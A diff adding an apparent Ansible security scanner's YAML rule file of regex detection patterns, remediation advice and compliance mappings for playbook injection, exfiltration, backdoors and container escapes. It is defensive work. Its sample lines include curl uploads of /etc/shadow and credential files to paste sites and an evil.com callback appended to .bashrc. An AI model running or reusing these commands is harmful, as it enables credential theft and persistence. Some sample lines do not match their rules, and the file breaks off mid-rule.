@@ -1,0 +1,1096 @@
+name: "Malicious Activity Patterns"
+author: "Ansible Security Scanner Team"
+description: "Detects patterns indicating credential harvesting, backdoor installation, data exfiltration, or other malicious activities"
+
+patterns:
+  # Specific command injection patterns (order matters - specific patterns first!)
+  - id: "shell_command_injection"
+    category: "malicious_activity"
+    severity: "CRITICAL"
+    title: "Shell Command Injection"
+    description: >-
+        /bin/{bash,sh,zsh,fish} -c receives a string interpolated from {{
+        user_command }}. The payload is whatever the variable resolves to; this is
+        the textbook command-injection sink.
+    regex: "(?:/bin/(?:bash|sh|zsh|fish)).*-c.*\\{\\{.*user_command.*\\}\\}"
+    positive_examples:
+      - "/bin/bash-c{{user_command}}"
+    recommendation: "{{ user_command }} into /bin/{ba,z,fi}sh -c is a direct CWE-78 sink; remove the task and audit the host. Legitimate user-driven actions should be validated against an allow-list and dispatched as argv to ansible.builtin.command (no shell)."
+    nist_controls: ['AU-6', 'IR-4', 'SI-4']
+    pci_dss: ['10.4.1', '12.10.1']
+    soc2: ['CC7.3']
+
+  - id: "powershell_command_injection"
+    category: "malicious_activity"
+    severity: "CRITICAL"
+    title: "PowerShell Command Injection"
+    description: >-
+        powershell.exe / pwsh.exe -Command (or -ExecutionPolicy Bypass) receives a
+        string interpolated from {{ user_command }}. PowerShell with bypassed
+        execution policy runs anything the variable resolves to.
+    regex: "(?:powershell\\.exe|pwsh\\.exe).*(?:-Command|-ExecutionPolicy.*Bypass).*\\{\\{.*user_command.*\\}\\}"
+    positive_examples:
+      - "powershell.exe-Command{{user_command}}"
+    recommendation: "powershell.exe -Command {{ user_command }} (especially with -ExecutionPolicy Bypass) is direct code execution; remove the task and audit the host. Drive Windows operations via parameterised modules (ansible.windows.win_service, win_user, win_regedit) instead of inline PowerShell."
+    nist_controls: ['AU-6', 'IR-4', 'SI-4']
+    pci_dss: ['10.4.1', '12.10.1']
+    soc2: ['CC7.3']
+
+  - id: "windows_cmd_injection"
+    category: "malicious_activity"
+    severity: "CRITICAL"
+    title: "Windows CMD Command Injection"
+    description: >-
+        cmd.exe /c or /k receives a string interpolated from {{ user_command }}. cmd
+        metacharacters in the variable yield trivial command injection on Windows
+        targets.
+    regex: "cmd\\.exe.*/[ck].*\\{\\{.*user_command.*\\}\\}"
+    positive_examples:
+      - "cmd.exe/c{{user_command}}"
+    recommendation: "cmd.exe /c {{ user_command }} is direct code execution; remove the task and audit the host. Replace with ansible.windows.win_command (argv form) or a purpose-built module."
+    nist_controls: ['AU-6', 'IR-4', 'SI-4']
+    pci_dss: ['10.4.1', '12.10.1']
+    soc2: ['CC7.3']
+
+  - id: "adb_command_injection"
+    category: "malicious_activity"
+    severity: "CRITICAL"
+    title: "Android ADB Command Injection"
+    description: >-
+        adb shell receives a string interpolated from {{ user_command }}. An
+        attacker-controlled command string runs on every connected Android device
+        with debugging enabled.
+    regex: "adb\\s+shell\\s+.*\\{\\{.*user_command.*\\}\\}"
+    positive_examples:
+      - "adb shell {{user_command}}"
+    recommendation: "adb shell {{ user_command }} executes attacker-supplied code on the device; remove the task. Device automation should drive a controller-vetted wrapper that validates the requested action against an allow-list before calling adb."
+    nist_controls: ['AU-6', 'IR-4', 'SI-4']
+    pci_dss: ['10.4.1', '12.10.1']
+    soc2: ['CC7.3']
+
+  - id: "systemd_command_injection"
+    category: "malicious_activity"
+    severity: "CRITICAL"
+    title: "Systemd Command Injection"
+    description: >-
+        systemd-run --scope --user receives a string interpolated from {{
+        user_command }}. systemd scopes inherit the invoking user's privileges and
+        run whatever the variable resolves to.
+    regex: "systemd-run.*--scope.*--user.*\\{\\{.*user_command.*\\}\\}"
+    positive_examples:
+      - "systemd-run--scope--user{{user_command}}"
+    recommendation: "systemd-run --scope --user {{ user_command }} delegates execution to a system service manager with attacker bytes; remove the task and audit. Use ansible.builtin.systemd_service with a static unit file rather than ad-hoc transient units."
+    nist_controls: ['AU-6', 'IR-4', 'SI-4']
+    pci_dss: ['10.4.1', '12.10.1']
+    soc2: ['CC7.3']
+
+  - id: "container_command_injection"
+    category: "malicious_activity"
+    severity: "CRITICAL"
+    title: "Container Command Injection"
+    description: >-
+        Container `command:` array contains a {{ user_command }} entry. The
+        container's entrypoint runs the user-controlled string with the container's
+        full capabilities.
+    # `"command": [ ... ]` list in a K8s/container spec can be authored with
+    # the variable on a different line from the opening bracket.
+    regex: "\"command\":\\s*\\[[\\s\\S]{0,200}?\\{\\{[^}]*user_command[^}]*\\}\\}"
+    positive_examples:
+      - '"command":[{{user_command}}'
+    multiline: true
+    window: 10
+    recommendation: "Templating {{ user_command }} into a container's command: array gives the caller code execution inside the container; replace with a static command + args list and pass user-controlled values as environment variables that the container process validates."
+    nist_controls: ['AU-6', 'IR-4', 'SI-4']
+    pci_dss: ['10.4.1', '12.10.1']
+    soc2: ['CC7.3']
+
+  - id: "network_command_injection"
+    category: "malicious_activity"
+    severity: "CRITICAL"
+    title: "Network Command Injection"
+    description: >-
+        ssh/lftp/sftp invocation interpolates {{ user_command }} into the remote
+        command. The injected payload runs on the remote host, not the controller.
+    regex: "(?:ssh|lftp|sftp).*\\{\\{.*user_command.*\\}\\}"
+    positive_examples:
+      - "ssh{{user_command}}"
+    recommendation: "ssh/lftp/sftp ... {{ user_command }} runs attacker bytes on the remote host; remove the task and audit both ends. If remote execution is needed, declare the target with the appropriate Ansible connection plugin and call ansible.builtin.command - never compose a remote shell line by string."
+    nist_controls: ['AU-6', 'IR-4', 'SI-4']
+    pci_dss: ['10.4.1', '12.10.1']
+    soc2: ['CC7.3']
+
+  - id: "scheduled_task_injection"
+    category: "malicious_activity"
+    severity: "CRITICAL"
+    title: "Scheduled Task Command Injection"
+    description: >-
+        schtasks /create /tr ... receives a {{ user_command }} value as the task
+        action. The action runs with the scheduling user's privileges every time the
+        task fires.
+    regex: "schtasks.*/create.*/tr.*\\{\\{.*user_command.*\\}\\}"
+    positive_examples:
+      - "schtasks/create/tr{{user_command}}"
+    recommendation: "schtasks /create /tr {{ user_command }} schedules attacker-supplied code as the running user; remove the task and audit Task Scheduler. Use community.windows.win_scheduled_task with explicit, static action arguments."
+    nist_controls: ['AU-6', 'IR-4', 'SI-4']
+    pci_dss: ['10.4.1', '12.10.1']
+    soc2: ['CC7.3']
+
+  - id: "wmic_command_injection"
+    category: "malicious_activity"
+    severity: "CRITICAL"
+    title: "WMIC Command Injection"
+    description: >-
+        wmic process call create receives a {{ user_command }} argument. WMIC
+        executes the string in the SYSTEM context on the target.
+    regex: "wmic.*process.*call.*create.*\\{\\{.*user_command.*\\}\\}"
+    positive_examples:
+      - "wmicprocesscallcreate{{user_command}}"
+    recommendation: "wmic process call create {{ user_command }} executes the rendered string with the privileges of the WMI caller; remove the task and audit the host. Use ansible.windows.win_command for argv-style execution instead."
+    nist_controls: ['AU-6', 'IR-4', 'SI-4']
+    pci_dss: ['10.4.1', '12.10.1']
+    soc2: ['CC7.3']
+
+  - id: "data_exfiltration_curl"
+    category: "malicious_activity"
+    severity: "CRITICAL"
+    title: "curl Uploads Local File to External Endpoint (data-exfil primitive)"
+    description: "A ``shell``/``command`` task runs ``curl`` with a file-upload flag (``-T /path`` / ``-F 'file=@/path'`` / ``-F 'upload=@/path'`` / ``--data-binary @/path`` / ``--upload-file /path``) targeting an ANONYMOUS paste-or-upload service (``transfer.sh``, ``file.io``, ``0x0.st``, ``x0.at``, ``bashupload.com``, ``oshi.at``, ``catbox.moe``, ``litterbox.catbox.moe``, ``ix.io``, ``dpaste.com``, ``pastebin.com``, ``paste.ee``, ``hastebin.com``, ``termbin.com``, ``requestbin.net``, ``webhook.site``, ``beeceptor.com``, ``ngrok.io``, ``burpcollaborator.net``, ``interact.sh``). These are the canonical data-exfiltration landing pads in IR write-ups (MITRE T1567.002 - Exfiltration to Cloud Storage). Rule previously matched the keyword ``evil``/``attacker`` in curl URLs which produced zero TPs and every FP in the corpus came from Splunk-SOAR playbook ``description`` fields containing the word ``attacker``."
+    # Sub-shape A: curl file-upload flags targeting a known
+    # anonymous-paste host. This is the real exfil primitive.
+    # Sub-shape B: `curl ... https://<paste-host>/` without a local-
+    # file flag still looks exfil-adjacent (command substitution
+    # piping stdin) - include it but narrow the host list.
+    regex: "\\bcurl\\s+[^\\n]*?(?:-T\\s|--upload-file\\s|--data-binary\\s+['\\\"]?@|-F\\s+['\\\"]?[A-Za-z_][A-Za-z0-9_]*\\s*=\\s*@)[^\\n]*?https?://(?:[^\\s/'\\\"]*\\.)?(?:transfer\\.sh|file\\.io|0x0\\.st|x0\\.at|bashupload\\.com|oshi\\.at|catbox\\.moe|litterbox\\.catbox\\.moe|ix\\.io|dpaste\\.com|pastebin\\.com|paste\\.ee|hastebin\\.com|termbin\\.com|requestbin\\.net|webhook\\.site|beeceptor\\.com|ngrok\\.io|burpcollaborator\\.net|interact\\.sh)\\b|\\bcurl\\s+[^\\n]*?https?://(?:[^\\s/'\\\"]*\\.)?(?:transfer\\.sh|0x0\\.st|x0\\.at|bashupload\\.com|oshi\\.at|catbox\\.moe|termbin\\.com|burpcollaborator\\.net|interact\\.sh)\\b"
+    recommendation: "Exfiltration to paste-sites is a known post-compromise primitive; Ansible should never need it. If the task is a legitimate diagnostic dump (e.g. collecting a bug report), upload to YOUR org's object store over authenticated IAM (``amazon.aws.s3_object``, ``google.cloud.gcp_storage_object``) instead. Block these hosts at the egress firewall and alert on any curl PUT/POST to them from managed nodes."
+    positive_examples:
+      - "    shell: curl -T /etc/shadow https://transfer.sh/"
+      - "    shell: curl -F 'file=@/var/log/auth.log' https://0x0.st"
+      - "    shell: curl --data-binary @/tmp/creds.json https://webhook.site/abcd"
+      - "    command: curl -T dump.tar.gz https://bashupload.com/"
+      - "    shell: cat /etc/hosts | curl -F 'f=@-' https://catbox.moe/user/api.php"
+    negative_examples:
+      - "    shell: curl -d '{\"description\": \"attackers often use phishing\"}' https://splunk-soar/rest"
+      - "    shell: curl -d @payload.json https://api.internal.corp/v1/alerts"
+      - "    shell: curl -F 'file=@build.tar' https://artifacts.internal.corp/upload"
+      - "    shell: curl -T release.tgz https://nexus.corp/repository/"
+    cwe: ["CWE-200", "CWE-319"]
+    mitre_attack: ["T1048", "T1567", "T1567.002"]
+    nist_controls: ['AU-6', 'IR-4', 'SI-4']
+    pci_dss: ['10.4.1', '12.10.1']
+    soc2: ['CC7.3']
+
+  - id: "credential_file_upload"
+    category: "malicious_activity"
+    severity: "CRITICAL"
+    title: "Credential File Upload"
+    description: >-
+        curl -F file=@... uploads a 'credentials' path to a remote endpoint. The
+        shape stages credentials for exfiltration via a multipart POST.
+    regex: "curl.*-F.*file=@.*credentials"
+    positive_examples:
+      - "curl-Ffile=@credentials"
+    recommendation: "curl -F file=@.../credentials uploads a credential file to a remote endpoint; remove the task, rotate any uploaded credentials, and audit egress logs for the destination."
+    nist_controls: ['AU-6', 'IR-4', 'SI-4']
+    pci_dss: ['10.4.1', '12.10.1']
+    soc2: ['CC7.3']
+
+  - id: "backdoor_bashrc"
+    category: "malicious_activity"
+    severity: "CRITICAL"
+    title: "Backdoor in Bashrc"
+    description: >-
+        echo '... curl evil.com ...' >> ~/.bashrc plants a callback that fires every
+        time the user opens a shell. A classic low-tech persistence and beaconing
+        pattern.
+    regex: "echo.*curl.*evil\\.com.*>>.*\\.bashrc"
+    positive_examples:
+      - "echocurlevil.com>>.bashrc"
+    recommendation: "Appending curl http://evil.com to ~/.bashrc plants a per-shell backdoor; remove the task, audit ~/.bashrc / ~/.bash_profile / ~/.profile / ~/.zshrc on all affected hosts, and rotate any credentials reachable from the user's shell environment."
+    nist_controls: ['AU-6', 'IR-4', 'SI-4']
+    pci_dss: ['10.4.1', '12.10.1']
+    soc2: ['CC7.3']
+
+  - id: "ssh_key_backdoor"
+    category: "malicious_activity"
+    severity: "CRITICAL"
+    title: "SSH Key Backdoor"
+    description: >-
+        ssh-keygen names a 'backdoor' key, or authorized_keys is appended to with a
+        'backdoor' label. Either shape installs an attacker-controlled SSH
+        credential for persistence.
+    regex: "ssh-keygen.*backdoor|authorized_keys.*backdoor"
+    positive_examples:
+      - "ssh-keygenbackdoor"
+    recommendation: "ssh-keygen / authorized_keys writes named with 'backdoor' indicate persistent access provisioning; remove the task, audit ~/.ssh/authorized_keys on every account, and re-provision SSH access via ansible.posix.authorized_key sourced from an inventory-managed allow-list."
+    nist_controls: ['AU-6', 'IR-4', 'SI-4']
+    pci_dss: ['10.4.1', '12.10.1']
+    soc2: ['CC7.3']
+
+  - id: "credential_harvesting_env"
+    category: "malicious_activity"
+    severity: "CRITICAL"
+    title: "Credential Harvesting from Environment"
+    description: >-
+        echo $MASTER_PASSWORD / AWS_ACCESS_KEY / GITHUB_TOKEN / DOCKER_TOKEN
+        appended to ~/.bashrc, .bash_profile, .zshrc, or .zprofile. The shape
+        exfiltrates env-resident secrets to a user-readable file.
+    regex: "echo.*(?:MASTER_PASSWORD|AWS_ACCESS_KEY|GITHUB_TOKEN|DOCKER_TOKEN).*>>.*\\.(bashrc|bash_profile|zshrc|zprofile)"
+    positive_examples:
+      - "echoMASTER_PASSWORD>>.bashrc"
+    recommendation: "Echoing MASTER_PASSWORD / AWS_ACCESS_KEY / GITHUB_TOKEN / DOCKER_TOKEN into shell rc files persists secrets in user-readable plaintext; remove the task, rotate every captured credential, and source secrets from a secrets manager (Vault, AWS SM, GCP SM) at runtime instead."
+    nist_controls: ['AU-6', 'IR-4', 'SI-4']
+    pci_dss: ['10.4.1', '12.10.1']
+    soc2: ['CC7.3']
+
+  - id: "system_file_permissions"
+    category: "malicious_activity"
+    severity: "HIGH"
+    title: "Dangerous File Permissions"
+    description: >-
+        chmod 666 / 777 targets ~/.bashrc, ~/.ssh, ~/.aws, or ~/.docker.
+        World-writable config files let any local user inject commands into the next
+        shell or auth lookup.
+    regex: "chmod\\s+(?:666|777).*\\.(bashrc|ssh|aws|docker)"
+    positive_examples:
+      - "chmod 666.bashrc"
+    recommendation: "chmod 666/777 on .bashrc, .ssh, .aws, .docker enables tampering by any local user; reset the affected paths to mode 0600 (files) / 0700 (directories) with the correct owner, and audit recent modifications for tampering."
+    nist_controls: ['AU-6', 'IR-4', 'SI-4']
+    pci_dss: ['10.4.1', '12.10.1']
+    soc2: ['CC7.3']
+
+  - id: "docker_privileged_host"
+    category: "malicious_activity"
+    severity: "CRITICAL"
+    title: "Privileged Container with Host Access"
+    description: >-
+        docker run --privileged combined with --pid=host or --net=host. The
+        container shares the host's PID/network namespace with no capability
+        filtering - effectively root on the host.
+    regex: "docker\\s+run.*--privileged.*--(?:pid|net)=host"
+    positive_examples:
+      - "docker run--privileged--pid=host"
+    recommendation: "--privileged combined with --pid=host or --net=host effectively grants the container root on the node; replace with the minimum --cap-add= the workload needs, drop the rest, and use a user-defined network and PID namespace."
+    nist_controls: ['AU-6', 'IR-4', 'SI-4']
+    pci_dss: ['10.4.1', '12.10.1']
+    soc2: ['CC7.3']
+
+  - id: "container_root_mount"
+    category: "malicious_activity"
+    severity: "CRITICAL"
+    title: "Container Root Filesystem Mount"
+    description: >-
+        docker run -v /:/<path>:rw or -v /:/rootfs mounts the host root filesystem
+        into the container. The container can edit /etc/sudoers, /etc/passwd, or any
+        path on the host.
+    regex: "docker\\s+run.*-v\\s+/:/.*:rw|docker\\s+run.*-v\\s+/:/rootfs"
+    positive_examples:
+      - "docker run-v /:/:rw"
+    recommendation: "Bind-mounting the host's / (read-write) into a container is a trivial container-escape primitive; remove the mount, scope volumes to the specific directories the workload requires, and mount them read-only where possible."
+    nist_controls: ['AU-6', 'IR-4', 'SI-4']
+    pci_dss: ['10.4.1', '12.10.1']
+    soc2: ['CC7.3']
+
+  - id: "container_breakout"
+    category: "malicious_activity"
+    severity: "CRITICAL"
+    title: "Container Breakout Attempt"
+    description: >-
+        chroot /rootfs is invoked - the canonical second step after mounting the
+        host root into a container. The shape escapes the container's filesystem
+        isolation.
+    regex: "chroot\\s+/rootfs"
+    positive_examples:
+      - "chroot /rootfs"
+    recommendation: "chroot /rootfs (typically combined with /var/run/docker.sock or a privileged container) is a textbook container escape; remove the task, audit the affected node, and revoke the credentials of any account that scheduled the workload."
+    nist_controls: ['AU-6', 'IR-4', 'SI-4']
+    pci_dss: ['10.4.1', '12.10.1']
+    soc2: ['CC7.3']
+
+  - id: "kubernetes_privileged_pod"
+    category: "malicious_activity"
+    severity: "CRITICAL"
+    title: "Privileged Kubernetes Pod"
+    description: >-
+        Pod manifest sets hostNetwork: true, hostPID: true, or privileged: true.
+        Each individually grants the pod near-host capabilities; combined, they make
+        the pod equivalent to root on the node.
+    regex: "hostNetwork.*true|hostPID.*true|privileged.*true"
+    positive_examples:
+      - "hostNetwork: true"
+    recommendation: "hostNetwork: true / hostPID: true / privileged: true bypass Pod isolation; drop these settings, set the pod's securityContext to runAsNonRoot: true and allowPrivilegeEscalation: false, and admit only via a Pod Security Standard of 'restricted'."
+    nist_controls: ['AU-6', 'IR-4', 'SI-4']
+    pci_dss: ['10.4.1', '12.10.1']
+    soc2: ['CC7.3']
+    stig: ['V-254800']
+
+  - id: "database_credential_exposure"
+    category: "malicious_activity"
+    severity: "HIGH"
+    title: "Database Credential Exposure"
+    description: >-
+        mysql/PGPASSWORD/sqlplus/sqlcmd/cqlsh invocation embeds -p with a literal or
+        templated value on argv. The credential appears in /proc/<pid>/cmdline
+        regardless of no_log.
+    regex: "(?:mysql|PGPASSWORD|sqlplus|sqlcmd|cqlsh).*-p.*\\{\\{.*\\}\\}|(?:mysql|psql).*-p[\"'][^\"']*[\"']"
+    positive_examples:
+      - "_suse_php_common: [\"php{{ _suse_php_v }}-mysql\", \"php{{ _suse_php_v }}-openssl\", \"php{{ _suse_php_v }}-pgsql\", \"php{{ _suse_php_v }}-xmlreader\", \"php{{ _suse_php_v }}-xmlwriter\"]"
+    recommendation: "Database CLIs receiving credentials via -p / -W on argv leak them through /proc; pass credentials via env (PGPASSWORD), .my.cnf (mode 0600), or - preferred - the community.{mysql,postgresql,mongodb} modules with login_* parameters loaded from Ansible Vault."
+    nist_controls: ['AU-6', 'IR-4', 'SI-4']
+    pci_dss: ['10.4.1', '12.10.1']
+    soc2: ['CC7.3']
+
+  - id: "ci_cd_pipeline_injection"
+    category: "malicious_activity"
+    severity: "HIGH"
+    title: "CI/CD Pipeline Injection"
+    description: >-
+        curl POSTs to jenkins/gitlab/github build, pipeline, or dispatches endpoints
+        with attacker-controllable variables. The shape injects work into a CI
+        system that runs with high-trust credentials.
+    regex: "curl.*(?:jenkins|gitlab|github).*(?:build|pipeline|dispatches).*(?:COMMAND|variables|command)"
+    positive_examples:
+      - "curljenkinsbuildCOMMAND"
+    recommendation: "curl into Jenkins/GitLab/GitHub build endpoints with attacker-controlled COMMAND / variables fields enables arbitrary pipeline execution; route all pipeline triggers through the platform's signed-webhook + HMAC verification flow, and never expose the trigger token in playbook source."
+    nist_controls: ['AU-6', 'IR-4', 'SI-4']
+    pci_dss: ['10.4.1', '12.10.1']
+    soc2: ['CC7.3']
+
+  - id: "system_information_gathering"
+    category: "malicious_activity"
+    severity: "MEDIUM"
+    title: "System Information Gathering"
+    description: >-
+        find -name -exec, ps aux | grep, netstat | grep, or env | grep filtered
+        against SECRET/PASSWORD/TOKEN. The combination is the post-exploitation
+        reconnaissance shape.
+    regex: "(?:find.*-name.*-exec.*\\{\\}|ps\\s+aux.*grep|netstat.*grep|env.*grep.*(?:SECRET|PASSWORD|TOKEN))"
+    positive_examples:
+      - "find . -name \"Dockerfile*\" -exec echo \"=== {} ===\" \\; -exec grep -i \"conmon\\|runc\\|crun\" {} \\; 2>/dev/null || echo \"No Dockerfiles with runtime info\""
+    recommendation: "find -exec / ps aux | grep / netstat | grep / env | grep SECRET|PASSWORD|TOKEN is reconnaissance; remove the task. Legitimate inventory should be collected via ansible.builtin.setup or a purpose-built fact module, not ad-hoc shell pipelines that grep for secrets."
+    nist_controls: ['AU-6', 'IR-4', 'SI-4']
+    pci_dss: ['10.4.1', '12.10.1']
+    soc2: ['CC7.3']
+
+  - id: "monitoring_system_compromise"
+    category: "malicious_activity"
+    severity: "HIGH"
+    title: "Monitoring System Compromise"
+    description: >-
+        curl targets elasticsearch _security/users, grafana admin users, or splunk
+        authentication users. Compromising the monitoring tier disables the audit
+        trail attackers want to evade.
+    regex: "curl.*(?:elasticsearch.*_security|grafana.*admin|splunk.*authentication).*users"
+    positive_examples:
+      - "curlelasticsearch_securityusers"
+    recommendation: "Calling Elasticsearch _security / Grafana admin / Splunk authentication endpoints from a playbook is suspicious unless the play is purpose-built for platform admin; if not, remove the task, rotate the API keys reachable on the host, and audit the platform's audit log for the originating IP."
+    nist_controls: ['AU-6', 'IR-4', 'SI-4']
+    pci_dss: ['10.4.1', '12.10.1']
+    soc2: ['CC7.3']
+
+  - id: "cloud_credential_exposure"
+    category: "malicious_activity"
+    severity: "CRITICAL"
+    title: "Cloud Credential Exposure"
+    description: >-
+        export AWS_ACCESS_KEY_ID / AWS_SECRET_ACCESS_KEY /
+        GOOGLE_APPLICATION_CREDENTIALS=... resolves a {{ }} expression. The shape
+        leaks cloud credentials into the shell environment of subsequent commands.
+    regex: "export.*(?:AWS_ACCESS_KEY_ID|AWS_SECRET_ACCESS_KEY|GOOGLE_APPLICATION_CREDENTIALS)=.*\\{\\{.*\\}\\}"
+    positive_examples:
+      - "export AWS_ACCESS_KEY_ID={{aws_access_key}}"
+    recommendation: "export AWS_ACCESS_KEY_ID=... / AWS_SECRET_ACCESS_KEY=... / GOOGLE_APPLICATION_CREDENTIALS=... = {{ var }} in a shell task leaks the credential to /proc and shell history; pass cloud credentials via the cloud module's auth parameters (amazon.aws.aws_caller_info, google.cloud.gcp_*) loaded from Ansible Vault, or use IAM roles / Workload Identity instead of static keys."
+    nist_controls: ['AU-6', 'IR-4', 'SI-4']
+    pci_dss: ['10.4.1', '12.10.1']
+    soc2: ['CC7.3']
+
+  - id: "enterprise_service_exploitation"
+    category: "malicious_activity"
+    severity: "HIGH"
+    title: "Enterprise Service Exploitation"
+    description: >-
+        curl to Okta or Auth0 with `Authorization: SSWS|Bearer {{ ... }}`. The shape
+        exercises identity-provider APIs with playbook-resident bearer tokens.
+    regex: "curl.*(?:okta|auth0).*Authorization:.*(?:SSWS|Bearer).*\\{\\{.*\\}\\}"
+    positive_examples:
+      - "curloktaAuthorization:SSWS{{}}"
+    recommendation: "curl ... okta|auth0 ... Authorization: SSWS|Bearer {{ var }} indicates direct API access against an identity provider; if this is intentional administrative automation, route through the vendor's Ansible collection (community.okta, community.general.auth0) with credentials in Vault and IP allow-list enforcement at the IdP."
+    nist_controls: ['AU-6', 'IR-4', 'SI-4']
+    pci_dss: ['10.4.1', '12.10.1']
+    soc2: ['CC7.3']
+
+  - id: "network_enumeration"
+    category: "malicious_activity"
+    severity: "MEDIUM"
+    title: "Network Enumeration"
+    description: >-
+        nmap -sS -O or masscan --rate is invoked with {{ }} arguments. Active port
+        scanning from inside the network is the canonical lateral-movement preamble.
+    regex: "(?:nmap.*-sS.*-O|masscan.*--rate).*\\{\\{.*\\}\\}"
+    positive_examples:
+      - "nmap-sS-O{{}}"
+    recommendation: "nmap -sS -O / masscan --rate of attacker-controlled targets is reconnaissance; if discovery is genuinely required, drive it from a sanctioned scanner (Nessus, Tenable, Qualys) whose scope is reviewed by a security team, not from ad-hoc playbook commands."
+    nist_controls: ['AU-6', 'IR-4', 'SI-4']
+    pci_dss: ['10.4.1', '12.10.1']
+    soc2: ['CC7.3']
+
+  - id: "advanced_data_harvesting"
+    category: "malicious_activity"
+    severity: "HIGH"
+    title: "Advanced Data Harvesting"
+    description: >-
+        for-loop iterates over /etc/passwd and /etc/shadow as config_file values.
+        Reading shadow requires root and is the shape used to stage offline password
+        cracking.
+    regex: "for.*config_file.*in.*/etc/passwd.*/etc/shadow"
+    positive_examples:
+      - "forconfig_filein/etc/passwd/etc/shadow"
+    recommendation: "Iterating across /etc/passwd / /etc/shadow harvests credential databases; remove the task and audit. /etc/shadow content should never leave the host - if password policy auditing is required, run it locally with a dedicated tool (pwquality, pam_pwquality) and ship only the resulting verdict."
+    nist_controls: ['AU-6', 'IR-4', 'SI-4']
+    pci_dss: ['10.4.1', '12.10.1']
+    soc2: ['CC7.3']
+
+  - id: "systemd_exploitation"
+    category: "malicious_activity"
+    severity: "MEDIUM"
+    title: "Systemd Service Exploitation"
+    description: >-
+        systemd-run --scope --user receives a {{ }} expression. User-scoped systemd
+        units inherit the invoker's session and are a quiet way to run code on
+        managed hosts.
+    regex: "systemd-run.*--scope.*--user.*\\{\\{.*\\}\\}"
+    positive_examples:
+      - "systemd-run--scope--user{{}}"
+    recommendation: "systemd-run --scope --user {{ var }} schedules attacker-supplied bytes as a transient unit; remove the task and audit. Use ansible.builtin.systemd_service with a static unit file under /etc/systemd/system/ for any legitimate work."
+    nist_controls: ['AU-6', 'IR-4', 'SI-4']
+    pci_dss: ['10.4.1', '12.10.1']
+    soc2: ['CC7.3']
+
+  - id: "credential_dump_creation"
+    category: "malicious_activity"
+    severity: "CRITICAL"
+    title: "Credential Dump Creation"
+    description: >-
+        cat heredoc writes a 'credential' file at a templated path. The shape stages
+        a multi-credential dump for later exfiltration.
+    regex: "cat.*>.*\\{\\{.*\\}\\}.*credential.*<<.*EOF"
+    positive_examples:
+      - "cat>{{}}credential<<EOF"
+    recommendation: "Heredoc-based bulk writes to a 'credential' file are credential staging; remove the task, audit the destination path for prior dumps, and rotate every credential reachable from the host."
+    nist_controls: ['AU-6', 'IR-4', 'SI-4']
+    pci_dss: ['10.4.1', '12.10.1']
+    soc2: ['CC7.3']
+
+  - id: "data_archiving_exfiltration"
+    category: "malicious_activity"
+    severity: "HIGH"
+    title: "Data Archiving for Exfiltration"
+    description: >-
+        tar -czf {{ ... }}.tar.gz packages a templated source path into a single
+        archive. Archives are the standard staging shape before egress.
+    regex: "tar.*-czf.*\\{\\{.*\\}\\}.*\\.tar\\.gz"
+    positive_examples:
+      - "tar-czf{{}}.tar.gz"
+    recommendation: "tar -czf {{ var }}.tar.gz immediately preceding an outbound transfer is a stage-and-exfil primitive; if a backup is intended, use a sanctioned backup tool (restic, borg) with an off-host repository, encryption, and access logging, rather than an ad-hoc tar pipeline."
+    nist_controls: ['AU-6', 'IR-4', 'SI-4']
+    pci_dss: ['10.4.1', '12.10.1']
+    soc2: ['CC7.3']
+
+  - id: "file_permission_tampering"
+    category: "malicious_activity"
+    severity: "MEDIUM"
+    title: "File Permission Tampering"
+    description: >-
+        chmod 666 against a {{ ... }} path opens a templated file to world-writable.
+        The shape disables filesystem isolation to land follow-on writes.
+    regex: "chmod.*666.*\\{\\{.*\\}\\}"
+    positive_examples:
+      - "chmod666{{}}"
+    recommendation: "chmod 666 {{ path }} grants global write to whatever the variable resolves to; remove the chmod, set explicit modes (0640 files, 0750 dirs) via ansible.builtin.file with concrete paths, and audit the affected files for tampering."
+    nist_controls: ['AU-6', 'IR-4', 'SI-4']
+    pci_dss: ['10.4.1', '12.10.1']
+    soc2: ['CC7.3']
+
+  - id: "multi_platform_exploitation"
+    category: "malicious_activity"
+    severity: "HIGH"
+    title: "Multi-Platform Exploitation"
+    description: >-
+        powershell.exe -ExecutionPolicy Bypass or cmd.exe /c|/k with a {{ }}
+        expression. The dual-shape signals a payload designed to run across both
+        Windows shell stacks.
+    regex: "powershell\\.exe.*-ExecutionPolicy.*Bypass|cmd\\.exe.*/[ck].*\\{\\{.*\\}\\}"
+    positive_examples:
+      - "win_command: cmd.exe /c mklink /d \"{{ remote_tmp_dir }}\\link-test\\link\" \"{{ remote_tmp_dir }}\\link-test\\link-target\""
+    recommendation: "powershell -ExecutionPolicy Bypass and cmd /c {{ var }} together are cross-platform code execution primitives; remove the tasks and audit. Drive Windows operations via parameterised modules (ansible.windows.*) instead."
+    nist_controls: ['AU-6', 'IR-4', 'SI-4']
+    pci_dss: ['10.4.1', '12.10.1']
+    soc2: ['CC7.3']
+
+  - id: "registry_manipulation"
+    category: "malicious_activity"
+    severity: "HIGH"
+    title: "Windows Registry Manipulation"
+    description: >-
+        reg.exe add HKLM\... with the value containing 'password', 'secret', 'key',
+        or 'token'. The shape persists secret data in system-wide Windows registry
+        hives.
+    regex: "reg\\.exe.*add.*HKLM.*(?:password|secret|key|token)"
+    positive_examples:
+      - "reg.exeaddHKLMpassword"
+    recommendation: "reg.exe add HKLM ... password|secret|key|token writes a credential into the machine-wide registry hive in cleartext; remove the task, delete the key, and rotate the value into Windows Credential Manager (DPAPI) or an HSM-backed secrets store."
+    nist_controls: ['AU-6', 'IR-4', 'SI-4']
+    pci_dss: ['10.4.1', '12.10.1']
+    soc2: ['CC7.3']
+
+  - id: "mobile_platform_exploitation"
+    category: "malicious_activity"
+    severity: "HIGH"
+    title: "Mobile Platform Exploitation"
+    description: >-
+        adb shell `su -c` or `mount -o remount,rw /system`. The shape remounts the
+        Android system partition writable from a playbook-driven exploit chain.
+    regex: "adb.*shell.*(?:su.*-c|mount.*-o.*remount.*rw.*/system)"
+    positive_examples:
+      - "adbshellsu-c"
+    recommendation: "adb shell su -c / mount -o remount,rw /system rewrites the device's system partition; remove the task. Legitimate mobile management should drive an MDM (Intune, Jamf, AirWatch) rather than ad-hoc adb commands against unrooted devices."
+    nist_controls: ['AU-6', 'IR-4', 'SI-4']
+    pci_dss: ['10.4.1', '12.10.1']
+    soc2: ['CC7.3']
+
+  - id: "persistence_mechanism"
+    category: "malicious_activity"
+    severity: "HIGH"
+    title: "Persistence Mechanism Installation"
+    description: >-
+        cat heredoc writes a LaunchDaemons .plist, or schtasks /create with a
+        templated /tr action. Both shapes install persistence that survives reboot
+        and respawns the payload.
